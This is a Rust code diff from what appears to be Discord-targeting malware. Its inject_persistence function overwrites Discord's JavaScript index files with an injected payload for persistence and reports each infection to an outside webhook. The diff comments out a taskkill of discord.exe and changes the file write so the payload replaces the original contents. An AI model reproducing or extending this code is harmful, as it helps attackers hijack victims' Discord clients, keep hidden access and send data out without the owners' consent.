@@ -3,10 +3,10 @@ use dirs;
 use regex::Regex;
 use std::fs;
 use std::fs::File;
+use std::fs::OpenOptions;
 use std::io::prelude::*;
 use std::path::PathBuf;
 use std::process::Command;
-use std::thread;
 
 pub fn get_paths() -> Vec<PathBuf> {
     let app_data = dirs::config_dir();
@@ -97,15 +97,12 @@ pub fn inject_persistence() {
 
     //end discord process
     //taskkill /f /im discord.exe
-    let mut child = Command::new("cmd.exe")
+    /*let mut child = Command::new("cmd.exe")
         .arg("/C TASKKILL /F /IM discord.exe")
         .spawn()
         .expect("failed to execute child");
 
-    child.wait().expect("failed to kill discord");
-
-    //std::thread::sleep_ms(15000);
-    //for some reason, unable to write to discord js files
+    child.wait().expect("failed to kill discord");*/
 
     let persistence_paths = get_persistence_paths();
     for persist_loc in persistence_paths {
@@ -114,7 +111,7 @@ pub fn inject_persistence() {
             continue;
         }
 
-        let mut file_handle = File::open(&index_file).expect("unable to open file");
+        let mut file_handle = OpenOptions::new().read(true).write(true).open(&index_file).expect("failed to open file");
 
         let mut file_data = String::new();
         file_handle
@@ -122,7 +119,7 @@ pub fn inject_persistence() {
             .expect("failed to read file");
 
         file_handle
-            .write_all(format!("{}\n{}", to_dump, file_data).as_bytes())
+            .write_all(to_dump.as_bytes())
             .expect("unable to write to file");
         network::send_webhook_message(&format!(
             "installed persistence to {}",
